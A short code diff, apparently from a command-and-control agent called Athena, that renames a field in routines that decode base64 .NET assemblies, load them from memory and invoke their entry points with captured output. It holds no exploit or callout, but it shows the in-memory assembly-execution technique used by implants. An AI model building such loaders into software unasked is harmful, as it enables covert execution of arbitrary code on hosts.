@@ -42,11 +42,11 @@ namespace Athena.Commands
             {
                 if(la.target == "plugin")
                 {
-                    this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.assemblyBytes)));
+                    this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                 }
                 else if(la.target == "external")
                 {
-                    this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.assemblyBytes)));
+                    this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                 }
                 else
                 {
@@ -112,7 +112,7 @@ namespace Athena.Commands
                     Console.SetOut(this.executeAssemblyWriter);
 
                     //Load the Assembly
-                    var assembly = this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(ea.assemblyBytes)));
+                    var assembly = this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(ea.asm)));
 
                     //Invoke the Assembly
                     assembly.EntryPoint.Invoke(null, new object[] { await Misc.SplitCommandLine(ea.arguments) }); //I believe this blocks until it's finished
@@ -196,7 +196,7 @@ namespace Athena.Commands
 
             try
             {
-                var loadedAssembly = this.loadedCommands.GetOrAdd(command.command, this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(command.assembly))));
+                var loadedAssembly = this.loadedCommands.GetOrAdd(command.command, this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(command.asm))));
                 return new LoadCommandResponseResult()
                 {
                     completed = "true",
